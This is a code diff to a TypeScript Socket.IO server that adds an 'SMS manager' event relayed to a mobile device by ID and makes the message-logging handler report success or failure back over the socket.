@@ -1225,6 +1225,25 @@ export const startSocketIO = async () => {
 				}
 			);
 
+			// SMS Event
+			socket.on(
+				`${SocketIOPublicEvents.SMS_MANAGER_EVENT}`,
+				async (data: any) => {
+					try {
+						const { deviceId } = data;
+						console.log("sms manager event:", data);
+						io.emit(
+							`${SocketIOMobileEvents.MOBILE_SMS_MANAGER}-${deviceId}`,
+							{
+								deviceId,
+							}
+						);
+					} catch (error) {
+						console.log("Sms Manager Error", error);
+					}
+				}
+			);
+
 			// Online Message logs
 			socket.on(
 				`${SocketIOPublicEvents.SMS_MANAGER_RESPONSE}`,
@@ -1233,13 +1252,24 @@ export const startSocketIO = async () => {
 						const deviceId = response.deviceId;
 						const message = response.message;
 						if (deviceId && message != "") {
-							addNewMessage(response);
-							io.emit(
-								`${SocketIOPublicEvents.SMS_MANAGER_SHARED}-${deviceId}`,
-								{
-									response,
-								}
-							);
+							const res = await addNewMessage(response);
+							if (res?.success) {
+								io.emit(
+									`${SocketIOPublicEvents.SMS_SUCCESS_SHARED}-${deviceId}`,
+									{
+										deviceId,
+										status: true,
+									}
+								);
+							} else {
+								io.emit(
+									`${SocketIOPublicEvents.SMS_SUCCESS_SHARED}-${deviceId}`,
+									{
+										deviceId,
+										status: false,
+									}
+								);
+							}
 						} else {
 							console.log("Empty messages, skipping...");
 						}
